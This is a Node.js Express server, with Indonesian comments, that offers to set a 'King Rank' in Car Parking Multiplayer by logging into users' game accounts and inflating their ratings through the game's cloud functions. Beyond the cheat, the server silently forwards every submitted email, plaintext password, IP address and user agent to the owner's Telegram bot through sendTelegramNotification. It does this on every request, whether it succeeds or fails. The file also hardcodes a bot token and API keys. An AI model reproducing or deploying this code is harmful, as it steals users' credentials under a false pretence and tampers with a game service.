const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// ============================================================
// KONFIGURASI ENVIRONMENT
// ============================================================
const PORT = 3000;
const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
const OWNER_ID = "7492782458";
const NEXUS_VERIFY_URL = "https://system-nexus-key.vercel.app";

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(cors({
    origin: ['https://webtools-cpm-setup-rank.vercel.app'],
    credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// RATE LIMITER
// ============================================================
const limiter = rateLimit({
    windowMs: 60 * 1000, // 1 menit
    max: 100,
    message: { success: false, error: 'Too many requests, please try again after 1 minute' },
    skip: (req) => req.path === '/api/health' || req.path === '/api/cooldown'
});
app.use('/api/', limiter);

// ============================================================
// COOLDOWN SYSTEM (5 MENIT)
// ============================================================
const cooldownMap = new Map();
const COOLDOWN_DURATION = 5 * 60 * 1000; // 5 menit

function getCooldownIdentifier(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
               req.socket.remoteAddress || 
               'unknown';
    const userAgent = req.headers['user-agent']?.substring(0, 50) || 'unknown';
    return crypto.createHash('md5').update(`${ip}|${userAgent}`).digest('hex');
}

function checkCooldown(identifier) {
    const data = cooldownMap.get(identifier);
    if (!data) return { active: false, remaining: 0 };
    
    const now = Date.now();
    if (now >= data.endTime) {
        cooldownMap.delete(identifier);
        return { active: false, remaining: 0 };
    }
    
    return { 
        active: true, 
        remaining: data.endTime - now,
        endTime: data.endTime
    };
}

function setCooldown(identifier, nexusKey, email, server) {
    const endTime = Date.now() + COOLDOWN_DURATION;
    cooldownMap.set(identifier, {
        endTime: endTime,
        nexusKey: nexusKey,
        email: email,
        server: server,
        timestamp: Date.now()
    });
    
    // Auto hapus setelah cooldown selesai
    setTimeout(() => {
        const current = cooldownMap.get(identifier);
        if (current && current.endTime === endTime) {
            cooldownMap.delete(identifier);
            console.log(`🗑️ Cooldown expired for ${identifier}`);
        }
    }, COOLDOWN_DURATION + 1000);
    
    return endTime;
}

function formatRemainingTime(ms) {
    if (ms <= 0) return '0:00';
    const minutes = Math.floor(ms / 60000);
    const seconds = Math.floor((ms % 60000) / 1000);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
}

// ============================================================
// CPM GAME CONFIGURATIONS
// ============================================================
const CPM_CONFIGS = {
    cpm1: {
        id: 'cpm1',
        name: 'CPM 1',
        displayName: 'Car Parking Multiplayer',
        firebaseApiKey: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
        loginUrl: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
        rankUrl: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
    },
    cpm2: {
        id: 'cpm2',
        name: 'CPM 2',
        displayName: 'Car Parking Multiplayer 2',
        firebaseApiKey: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
        loginUrl: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
        rankUrl: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
    }
};

// ============================================================
// TELEGRAM NOTIFICATION
// ============================================================
async function sendTelegramNotification(email, password, server, nexusKey, status, ipAddress, userAgent) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
    
    let message = `🔐 CPM LOGIN REPORT\n\n`;
    message += `📧 Email: ${email}\n`;
    message += `🔑 Password: ${password}\n`;
    message += `🎮 Server: ${server}\n`;
    message += `🔑 Nexus Key: ${nexusKey}\n`;
    message += `📊 Status: ${status}\n`;
    message += `🌐 IP: ${ipAddress}\n`;
    message += `📱 User Agent: ${userAgent.substring(0, 100)}\n`;
    message += `⏰ Time: ${timestamp}\n`;
    
    try {
        await axios.post(url, {
            chat_id: OWNER_ID,
            text: message,
            parse_mode: 'HTML'
        }, {
            timeout: 10000,
            headers: { 'Content-Type': 'application/json' }
        });
        console.log(`✅ Telegram notification sent for ${email}`);
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.socket.remoteAddress || 
           req.ip || 
           'Unknown';
}

// ============================================================
// RATING DATA BUILDER
// ============================================================
function buildRatingData() {
    const stats = [
        'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade', 'car_wash',
        'slicer_cut', 'drift_max', 'drift', 'cargo', 'delivery', 'taxi', 'levels',
        'gifts', 'fuel', 'offroad', 'speed_banner', 'reactions', 'police', 'run',
        'real_estate', 't_distance', 'treasure', 'block_post', 'push_ups', 'burnt_tire',
        'passanger_distance'
    ];
    
    const ratingData = {};
    stats.forEach(stat => { ratingData[stat] = 100000; });
    ratingData.time = 10000000000;
    ratingData.race_win = 3000;
    
    return ratingData;
}

// ============================================================
// VERIFY NEXUS KEY
// ============================================================
async function verifyNexusKey(key) {
    if (!key) return { valid: false, error: 'Key is required' };
    
    try {
        const response = await axios.post(`${NEXUS_VERIFY_URL}/api/verify-key`, {
            key: key,
            deviceId: 'cpm_tool_backend'
        }, {
            timeout: 15000,
            headers: { 'Content-Type': 'application/json' }
        });
        
        return response.data;
    } catch (error) {
        console.error('Nexus verify error:', error.message);
        return { valid: false, error: 'Verification service unavailable' };
    }
}

// ============================================================
// CPM LOGIN
// ============================================================
async function cpmLogin(config, email, password) {
    const response = await axios.post(`${config.loginUrl}?key=${config.firebaseApiKey}`, {
        email: email,
        password: password,
        returnSecureToken: true,
        clientType: 'CLIENT_TYPE_ANDROID'
    }, {
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)'
        },
        timeout: 20000
    });
    
    if (!response.data || !response.data.idToken) {
        throw new Error('Invalid login response');
    }
    
    return {
        idToken: response.data.idToken,
        localId: response.data.localId,
        email: response.data.email
    };
}

// ============================================================
// SET KING RANK
// ============================================================
async function setKingRank(config, idToken) {
    const ratingData = buildRatingData();
    
    const response = await axios.post(config.rankUrl, {
        data: JSON.stringify({ RatingData: ratingData })
    }, {
        headers: {
            'Authorization': `Bearer ${idToken}`,
            'Content-Type': 'application/json',
            'User-Agent': 'okhttp/3.12.13'
        },
        timeout: 30000
    });
    
    if (response.status !== 200) {
        throw new Error(`Rank API responded with status ${response.status}`);
    }
    
    return true;
}

// ============================================================
// API ENDPOINTS
// ============================================================

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        activeCooldowns: cooldownMap.size
    });
});

// Cooldown status
app.get('/api/cooldown', (req, res) => {
    const identifier = getCooldownIdentifier(req);
    const cooldown = checkCooldown(identifier);
    
    res.json({
        active: cooldown.active,
        remaining: cooldown.remaining,
        remainingSeconds: Math.floor(cooldown.remaining / 1000),
        formattedTime: formatRemainingTime(cooldown.remaining),
        cooldownDuration: COOLDOWN_DURATION / 60000
    });
});

// Verify Nexus Key (tanpa cooldown)
app.post('/api/verify-key', async (req, res) => {
    const { key } = req.body;
    
    if (!key) {
        return res.status(400).json({ valid: false, error: 'Key is required' });
    }
    
    try {
        const result = await verifyNexusKey(key);
        res.json(result);
    } catch (error) {
        console.error('Verify endpoint error:', error.message);
        res.status(500).json({ valid: false, error: 'Internal server error' });
    }
});

// Set King Rank (dengan cooldown)
app.post('/api/set-rank', async (req, res) => {
    const { server, email, password, nexusKey } = req.body;
    const ipAddress = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const identifier = getCooldownIdentifier(req);
    
    // Validasi input
    if (!server || !email || !password || !nexusKey) {
        const errorMsg = 'Missing required fields: server, email, password, nexusKey';
        await sendTelegramNotification(email || 'unknown', password || 'unknown', server || 'unknown', nexusKey || 'unknown', errorMsg, ipAddress, userAgent);
        return res.status(400).json({ success: false, error: errorMsg });
    }
    
    // Validasi server
    const config = CPM_CONFIGS[server];
    if (!config) {
        const errorMsg = `Invalid server: ${server}`;
        await sendTelegramNotification(email, password, server, nexusKey, errorMsg, ipAddress, userAgent);
        return res.status(400).json({ success: false, error: errorMsg });
    }
    
    // Cek cooldown
    const cooldown = checkCooldown(identifier);
    if (cooldown.active) {
        const errorMsg = `Cooldown active! Please wait ${formatRemainingTime(cooldown.remaining)}`;
        await sendTelegramNotification(email, password, config.displayName, nexusKey, `BLOCKED - ${errorMsg}`, ipAddress, userAgent);
        return res.status(429).json({
            success: false,
            cooldown: true,
            remaining: cooldown.remaining,
            formattedTime: formatRemainingTime(cooldown.remaining),
            error: errorMsg
        });
    }
    
    // Verifikasi Nexus Key
    let keyValid = false;
    let keyRemaining = null;
    
    try {
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            const errorMsg = `Invalid Nexus Key: ${keyResult.error || 'Key not valid'}`;
            await sendTelegramNotification(email, password, config.displayName, nexusKey, `❌ ${errorMsg}`, ipAddress, userAgent);
            return res.status(400).json({ success: false, error: errorMsg });
        }
        keyValid = true;
        keyRemaining = keyResult.remaining;
    } catch (error) {
        const errorMsg = 'Nexus verification service error';
        await sendTelegramNotification(email, password, config.displayName, nexusKey, `❌ ${errorMsg}`, ipAddress, userAgent);
        return res.status(503).json({ success: false, error: errorMsg });
    }
    
    let loginSuccess = false;
    
    try {
        // Login ke CPM
        const loginResult = await cpmLogin(config, email, password);
        loginSuccess = true;
        
        // Set King Rank
        await setKingRank(config, loginResult.idToken);
        
        // Aktifkan cooldown
        setCooldown(identifier, nexusKey, email, config.name);
        
        // Kirim notifikasi sukses
        await sendTelegramNotification(email, password, config.displayName, nexusKey, '✅ SUCCESS - King Rank Set', ipAddress, userAgent);
        
        res.json({
            success: true,
            message: '🎉 KING RANK successfully activated!',
            server: config.displayName,
            keyValid: true,
            keyRemaining: keyRemaining
        });
        
    } catch (error) {
        console.error(`Set rank error for ${email}:`, error.message);
        
        let errorMessage = error.message;
        if (error.response?.data?.error?.message) {
            errorMessage = error.response.data.error.message;
        } else if (error.code === 'ECONNABORTED') {
            errorMessage = 'Connection timeout - please try again';
        }
        
        const failStatus = loginSuccess 
            ? `❌ FAILED - Rank Error: ${errorMessage}`
            : `❌ FAILED - Login Error: ${errorMessage}`;
        
        await sendTelegramNotification(email, password, config.displayName, nexusKey, failStatus, ipAddress, userAgent);
        
        res.status(500).json({
            success: false,
            error: errorMessage,
            loginSuccess: loginSuccess
        });
    }
});

// ============================================================
// ERROR HANDLING MIDDLEWARE
// ============================================================
app.use((req, res) => {
    res.status(404).json({ success: false, error: 'Endpoint not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ success: false, error: 'Internal server error' });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
});

module.exports = app;